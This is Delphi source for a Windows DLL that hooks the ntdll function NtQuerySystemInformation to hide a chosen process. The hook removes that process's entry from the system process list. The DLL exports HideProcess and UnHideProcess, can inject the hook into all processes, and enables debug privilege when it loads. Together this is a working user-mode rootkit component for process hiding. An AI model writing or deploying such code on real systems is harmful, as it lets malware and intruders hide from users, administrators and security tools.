library HookLib;

{$SETPEFLAGS $0002 or $0004 or $0008 or $0010 or $0020 or $0200 or $0400 or $0800 or $1000}
{$WEAKLINKRTTI ON}
{$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}

uses
  Windows,
  TlHelp32,
  HookAPI in 'HookAPI.pas';

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


type
  UNICODE_STRING = record
    Length        : Word;
    MaximumLength : Word;
    Buffer        : Pointer;
  end;

  UNICODE_STRING_WOW64 = record
    Length        : Word;
    MaximumLength : Word;
    Buffer        : Pointer;
  end;

  UNICODE_STRING64 = record
    Length        : Word;
    MaximumLength : Word;
    Fill          : LongWord;
    Buffer        : Pointer;
  end;


  SYSTEM_PROCESS_INFORMATION = record
    NextEntryOffset              : ULONG;
    NumberOfThreads              : ULONG;
    WorkingSetPrivateSize        : LARGE_INTEGER;
    HardFaultCount               : ULONG;
    NumberOfThreadsHighWatermark : ULONG;
    CycleTime                    : ULONGLONG;
    CreateTime                   : LARGE_INTEGER;
    UserTime                     : LARGE_INTEGER;
    KernelTime                   : LARGE_INTEGER;
    ImageName                    : UNICODE_STRING;
    BasePriority                 : LONG;
    UniqueProcessId              : ULONG;
    InheritedFromUniqueProcessId : ULONG;
    HandleCount                  : ULONG;
    SessionId                    : ULONG;
    UniqueProcessKey             : ULONG_PTR;
    PeakVirtualSize              : SIZE_T;
    VirtualSize                  : SIZE_T;
    PageFaultCount               : ULONG;
    PeakWorkingSetSize           : SIZE_T;
    WorkingSetSize               : SIZE_T;
    QuotaPeakPagedPoolUsage      : SIZE_T;
    QuotaPagedPoolUsage          : SIZE_T;
    QuotaPeakNonPagedPoolUsage   : SIZE_T;
    QuotaNonPagedPoolUsage       : SIZE_T;
    PagefileUsage                : SIZE_T;
    PeakPagefileUsage            : SIZE_T;
    PrivatePageCount             : SIZE_T;
    ReadOperationCount           : LARGE_INTEGER;
    WriteOperationCount          : LARGE_INTEGER;
    OtherOperationCount          : LARGE_INTEGER;
    ReadTransferCount            : LARGE_INTEGER;
    WriteTransferCount           : LARGE_INTEGER;
    OtherTransferCount           : LARGE_INTEGER;
  end;

  SYSTEM_PROCESS_INFORMATION64 = record
    NextEntryOffset              : ULONG;
    NumberOfThreads              : ULONG;
    WorkingSetPrivateSize        : LARGE_INTEGER;
    HardFaultCount               : ULONG;
    NumberOfThreadsHighWatermark : ULONG;
    CycleTime                    : ULONGLONG;
    CreateTime                   : LARGE_INTEGER;
    UserTime                     : LARGE_INTEGER;
    KernelTime                   : LARGE_INTEGER;
    ImageName                    : UNICODE_STRING64;
    BasePriority                 : UINT64;
    UniqueProcessID              : UINT64;
    InheritedFromUniqueProcessId : UINT64;
    HandleCount                  : UINT64;
    SessionId                    : UINT64;
    UniqueProcessKey             : UINT64;
    PeakVirtualSize              : UINT64;
    VirtualSize                  : UINT64;
    PageFaultCount               : UINT64;
    PeakWorkingSetSize           : UINT64;
    WorkingSetSize               : UINT64;
    QuotaPeakPagedPoolUsage      : UINT64;
    QuotaPagedPoolUsage          : UINT64;
    QuotaPeakNonPagedPoolUsage   : UINT64;
    QuotaNonPagedPoolUsage       : UINT64;
    PagefileUsage                : UINT64;
    PeakPagefileUsage            : UINT64;
    PrivatePageCount             : UINT64;
    ReadOperationCount           : LARGE_INTEGER;
    WriteOperationCount          : LARGE_INTEGER;
    OtherOperationCount          : LARGE_INTEGER;
    ReadTransferCount            : LARGE_INTEGER;
    WriteTransferCount           : LARGE_INTEGER;
    OtherTransferCount           : LARGE_INTEGER;
  end;


  SYSTEM_INFORMATION_CLASS = (
                               SystemBasicInformation,
                               SystemProcessorInformation,
                               SystemPerformanceInformation,
                               SystemTimeOfDayInformation,
                               SystemPathInformation,
                               SystemProcessInformation,
                               SystemCallCountInformation,
                               SystemDeviceInformation,
                               SystemProcessorPerformanceInformation,
                               SystemFlagsInformation,
                               SystemCallTimeInformation,
                               SystemModuleInformation,
                               SystemLocksInformation,
                               SystemStackTraceInformation,
                               SystemPagedPoolInformation,
                               SystemNonPagedPoolInformation,
                               SystemHandleInformation,
                               SystemObjectInformation,
                               SystemPageFileInformation,
                               SystemVdmInstemulInformation,
                               SystemVdmBopInformation,
                               SystemFileCacheInformation,
                               SystemPoolTagInformation,
                               SystemInterruptInformation,
                               SystemDpcBehaviorInformation,
                               SystemFullMemoryInformation,
                               SystemLoadGdiDriverInformation,
                               SystemUnloadGdiDriverInformation,
                               SystemTimeAdjustmentInformation,
                               SystemSummaryMemoryInformation,
                               SystemMirrorMemoryInformation,
                               SystemPerformanceTraceInformation,
                               SystemObsolete0,
                               SystemExceptionInformation,
                               SystemCrashDumpStateInformation,
                               SystemKernelDebuggerInformation
                              );

  NTSTATUS = LongWord;

{
function NtQuerySystemInformation(
                                   SystemInformationClass: SYSTEM_INFORMATION_CLASS;
                                   SystemInformation: Pointer;
                                   SystemInformationLength: ULONG;
                                   ReturnLength: PULONG
                                  ): NTSTATUS; stdcall;
}

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

var
  TrueNtQSI: function(
                       SystemInformationClass: LongWord;
                       SystemInformation: Pointer;
                       SystemInformationLength: ULONG;
                       ReturnLength: PULONG
                      ): NTSTATUS; stdcall;

  NtQSI: Pointer;

  //OriginalBlock: TOriginalBlock; // Оригинальное начало функции
  CreatorMap: THandle = 0;
  GlobalHookHandle: THandle = 0;
  HookingState: Boolean = False;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


// Функция, которая будет выполнена вместо перехваченной NtQuerySystemInformation:
function HookedNtQSI(
                      SystemInformationClass: LongWord;
                      SystemInformation: Pointer;
                      SystemInformationLength: ULONG;
                      ReturnLength: PULONG
                     ): NTSTATUS; stdcall;
var
  MappingObject: THandle;
  MappedFilePointer: Pointer;
  HidingProcessID: LongWord;
  ProcessInfo: ^SYSTEM_PROCESS_INFORMATION64;
  NextEntryOffset: ULONG;
  LastEntryOffsetAddr: PULONG;
begin
  Result := TrueNtQSI(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
  if HookingState then Exit;


  if (SystemInformationClass = LongWord(SystemProcessInformation)) and (Result = 0) then
  begin
    MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');
    if MappingObject <> 0 then
    begin
      MappedFilePointer := MapViewOfFile(MappingObject, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(HidingProcessID));

      if MappedFilePointer <> nil then
      begin
        HidingProcessID := LongWord(MappedFilePointer^);
        ProcessInfo := SystemInformation;

        LastEntryOffsetAddr := @(ProcessInfo.NextEntryOffset);

        repeat
          NextEntryOffset := ProcessInfo.NextEntryOffset;

          // Ищем наш процесс:
          if ProcessInfo.UniqueProcessId = HidingProcessID then
          begin
            LastEntryOffsetAddr^ := NextEntryOffset;
            //ProcessInfo.UniqueProcessId := 9999;
            Break;
          end;

          LastEntryOffsetAddr := @(ProcessInfo.NextEntryOffset);

          // Получаем адрес следующего блока:
          ProcessInfo := Pointer(Int64(ProcessInfo) + NextEntryOffset);
        until NextEntryOffset = 0;

        UnmapViewOfFile(MappedFilePointer);
      end;

      CloseHandle(MappingObject);
    end;
  end;
end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure HideProcess(ProcessID: LongWord; HideInAllProcesses: Boolean); stdcall; export;
var
  MappingObject: THandle;
  MappedFilePointer: Pointer;
begin
  MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');
  if MappingObject = 0 then
  begin
    CreatorMap := CreateFileMapping(GetCurrentProcess, nil, PAGE_READWRITE, 0, SizeOf(ProcessID), 'HookAPI Map');
    if (GlobalHookHandle = 0) and HideInAllProcesses then
      HookEmAll(GlobalHookHandle);
  end;

  MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');


  MappedFilePointer := MapViewOfFile(MappingObject, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(ProcessID));
  LongWord(MappedFilePointer^) := ProcessID;
  UnmapViewOfFile(MappedFilePointer);
  CloseHandle(MappingObject);
end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


procedure UnHideProcess; stdcall; export;
begin
  HookingState := True;
  UnHook(@NtQSI, @TrueNtQSI);
  HookingState := False;
  if GlobalHookHandle <> 0 then UnHookEmAll(GlobalHookHandle);
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


procedure DLLMain(dwReason: LongWord);
begin
   case dwReason of
    DLL_PROCESS_ATTACH:
    begin
      NtSetPrivilege(SE_DEBUG_NAME, True);
      NtQSI := GetProcAddress(GetModuleHandle('ntdll.dll'), 'NtQuerySystemInformation');

      HookingState := True;

      SetHook(NtQSI, @HookedNtQSI, @TrueNtQSI);
      HookingState := False;
    end;

    DLL_PROCESS_DETACH:
    begin
      HookingState := True;
      UnHook(NtQSI, @TrueNtQSI);
      HookingState := False;
      FreeOriginalBlock(@TrueNtQSI);

      if CreatorMap <> 0 then
      begin
        CloseHandle(CreatorMap);
        if GlobalHookHandle <> 0 then UnHookEmAll(GlobalHookHandle);
      end;
    end;
  end;
end;


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

exports HideProcess;
exports UnHideProcess;

begin
  DllProc := @DLLMain;
  DllProc(DLL_PROCESS_ATTACH) ;
end.

